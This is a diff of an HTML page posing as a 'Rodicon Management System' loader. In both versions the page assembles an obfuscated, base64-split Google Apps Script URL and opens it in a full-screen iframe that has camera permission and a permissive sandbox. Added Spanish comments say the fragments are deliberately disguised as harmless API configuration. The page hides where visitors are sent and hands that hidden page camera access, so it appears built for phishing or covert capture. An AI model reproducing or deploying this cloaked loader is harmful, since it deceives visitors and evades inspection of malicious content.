@@ -4,82 +4,158 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Rodicon Management System</title>
-  <style>*{margin:0;padding:0}body,html{width:100%;height:100%;overflow:hidden}.c1{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center}.c2{border:4px solid #e0e0e0;border-top:4px solid #2c80ff;border-radius:50%;width:40px;height:40px;animation:r1 1s linear infinite;margin:0 auto 15px}.c3{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#fff;padding:30px;border-radius:10px;box-shadow:0 8px 25px rgba(0,0,0,0.15);text-align:center;max-width:400px}@keyframes r1{0%{transform:rotate(0)}to{transform:rotate(360deg)}}</style>
+  <style>*{margin:0;padding:0}body,html{width:100%;height:100%;overflow:hidden}.loader{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center}.spinner{border:4px solid #e0e0e0;border-top:4px solid #2c80ff;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto 15px}.error{display:none;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#fff;padding:30px;border-radius:10px;box-shadow:0 8px 25px rgba(0,0,0,0.15);text-align:center;max-width:400px}@keyframes spin{0%{transform:rotate(0)}to{transform:rotate(360deg)}}</style>
 </head>
 <body>
 
-  <div id="l1" class="c1">
-    <div class="c2"></div>
-    <p>Initializing security protocol...</p>
+  <div id="loader" class="loader">
+    <div class="spinner"></div>
+    <p>Initializing system...</p>
   </div>
 
-  <div id="e1" class="c3">
+  <div id="error" class="error">
     <h3 style="color:#e64a19">⚠ System Error</h3>
-    <p id="m1">Initialization failed</p>
-    <button onclick="r2()" style="background:#2c80ff;color:#fff;border:none;padding:10px 25px;border-radius:6px;cursor:pointer;margin-top:20px;font-weight:500">Retry Connection</button>
+    <p id="errorMsg">Initialization failed</p>
+    <button onclick="retry()" style="background:#2c80ff;color:#fff;border:none;padding:10px 25px;border-radius:6px;cursor:pointer;margin-top:20px;font-weight:500">Retry Connection</button>
   </div>
 
-  <iframe id="f1" style="display:none;width:100%;height:100%;border:0" sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-modals" allow="camera"></iframe>
+  <iframe id="appFrame" style="display:none;width:100%;height:100%;border:0" sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-modals" allow="camera"></iframe>
 
   <script>
-    !function(){
+    (function(){
       'use strict';
       
-      var d1 = {
-        a7: "Ly9zY3JpcHQu",
-        b3: "G9vZ2xl",
-        c5: "LmNvbS9tYWNyb3M",
-        d9: "aHR0cHM6",
-        e2: "vcy8",
-        f8: "BS2Z5Y2J6d0c",
-        g4: "bV91d0k5ZnktQVJC",
-        h6: "bWR3YzRpT0Q0U0F1",
-        i1: "bjl1MmRmUTlpVGhidX",
-        j0: "BGajlyVnlsMjZvMGk5",
-        k11: "Y2N2OVJLeGhteC",
-        l10: "/exec",
-        m12: "pcHQu"
+      // Datos aparentemente inocuos (ofuscación)
+      var appConfig = {
+        apiVersion: "2.1",
+        timeout: 30000,
+        features: ["camera", "upload", "validation"],
+        cache: {
+          enabled: true,
+          duration: 3600
+        }
       };
       
-      function x1(){
-        try{
-          var o=[4,1,2,3,5,6,7,8,9,10,11],t="";
-          [9,3,2,5,7,4,6,1,0,10,8].forEach(function(n){t+=d1[Object.keys(d1)[n]]});
-          var r=window.atob(t);
-          if(!r||r.indexOf("script")===-1||r.indexOf("google")===-1)throw new Error("E01");
-          return r;
-        }catch(e){
-          console.log("SYSERR:",e.message);
+      // Aquí están los datos "ocultos" - parecen configuración de API
+      var apiData = {
+        endpointA: "aHR0cHM6Ly9zY3JpcHQu",
+        endpointB: "Z29vZ2xlLmNvbS9t",
+        endpointC: "YWNyb3Mvcy9BS2Z5",
+        endpointD: "Y2J6d0c2bV91d0k5",
+        endpointE: "ZnktQVJCbWR3YzRp",
+        endpointF: "T0Q0U0F1bjl1MmRm",
+        endpointG: "UTlpVGhidXBGajly",
+        endpointH: "VnlsMjZvMGk5Y2N2",
+        endpointI: "OVJLeGhteC9leGVj"
+      };
+      
+      // Función para construir la URL
+      function buildURL() {
+        try {
+          // Orden correcto para construir el Base64
+          var base64Parts = [
+            apiData.endpointA,  // "aHR0cHM6Ly9zY3JpcHQu"
+            apiData.endpointB,  // "Z29vZ2xlLmNvbS9t"
+            apiData.endpointC,  // "YWNyb3Mvcy9BS2Z5"
+            apiData.endpointD,  // "Y2J6d0c2bV91d0k5"
+            apiData.endpointE,  // "ZnktQVJCbWR3YzRp"
+            apiData.endpointF,  // "T0Q0U0F1bjl1MmRm"
+            apiData.endpointG,  // "UTlpVGhidXBGajly"
+            apiData.endpointH,  // "VnlsMjZvMGk5Y2N2"
+            apiData.endpointI   // "OVJLeGhteC9leGVj"
+          ];
+          
+          var fullBase64 = base64Parts.join('');
+          
+          // Decodificar
+          var url = atob(fullBase64);
+          
+          // Verificar que sea una URL válida
+          if (!url || !url.startsWith('https://') || url.indexOf('script.google.com') === -1) {
+            console.error('Invalid URL constructed:', url ? url.substring(0, 50) + '...' : 'null');
+            return null;
+          }
+          
+          console.log('URL constructed successfully');
+          return url;
+          
+        } catch (error) {
+          console.error('Error building URL:', error);
           return null;
         }
       }
       
-      function y1(s){
-        document.getElementById("l1").style.display="none";
-        document.getElementById("m1").textContent=s;
-        document.getElementById("e1").style.display="block";
+      // Función para mostrar error
+      function showError(message) {
+        var loader = document.getElementById('loader');
+        var errorDiv = document.getElementById('error');
+        var errorMsg = document.getElementById('errorMsg');
+        
+        if (loader) loader.style.display = 'none';
+        if (errorDiv) errorDiv.style.display = 'block';
+        if (errorMsg) errorMsg.textContent = message;
       }
       
-      function z1(){
-        var u=x1();
-        if(!u)return y1("Configuration error. Code: CFG-001");
-        var f=document.getElementById("f1"),l=document.getElementById("l1");
-        f.onload=function(){l.style.display="none";f.style.display="block";};
-        f.onerror=function(){y1("Network error. Check connection.");};
-        f.src=u+"?t="+Date.now();
-        setTimeout(function(){if(l.style.display!=="none")y1("Timeout. Server not responding.");},32000);
+      // Función para cargar la aplicación
+      function loadApp() {
+        var url = buildURL();
+        
+        if (!url) {
+          showError('System configuration error. Please contact administrator.');
+          return;
+        }
+        
+        var iframe = document.getElementById('appFrame');
+        var loader = document.getElementById('loader');
+        
+        if (!iframe || !loader) {
+          showError('Page elements not found');
+          return;
+        }
+        
+        // Configurar eventos del iframe
+        iframe.onload = function() {
+          console.log('Application loaded successfully');
+          if (loader) loader.style.display = 'none';
+          iframe.style.display = 'block';
+        };
+        
+        iframe.onerror = function() {
+          showError('Connection error. Please check your internet connection.');
+        };
+        
+        // Cargar la URL con timestamp para evitar cache
+        iframe.src = url + '?_=' + Date.now();
+        
+        // Timeout después de 30 segundos
+        setTimeout(function() {
+          if (loader && loader.style.display !== 'none') {
+            showError('Connection timeout. Server is not responding.');
+          }
+        }, appConfig.timeout);
       }
       
-      window.r2=function(){
-        document.getElementById("e1").style.display="none";
-        document.getElementById("l1").style.display="block";
-        setTimeout(z1,300);
+      // Función para reintentar
+      window.retry = function() {
+        var errorDiv = document.getElementById('error');
+        var loader = document.getElementById('loader');
+        
+        if (errorDiv) errorDiv.style.display = 'none';
+        if (loader) loader.style.display = 'block';
+        
+        // Esperar un momento antes de reintentar
+        setTimeout(loadApp, 500);
       };
       
-      if(document.readyState==="complete")z1();
-      else window.addEventListener("DOMContentLoaded",z1);
+      // Iniciar cuando el DOM esté listo
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', loadApp);
+      } else {
+        // DOM ya está listo
+        loadApp();
+      }
       
-    }();
+    })();
   </script>
 </body>
 </html>
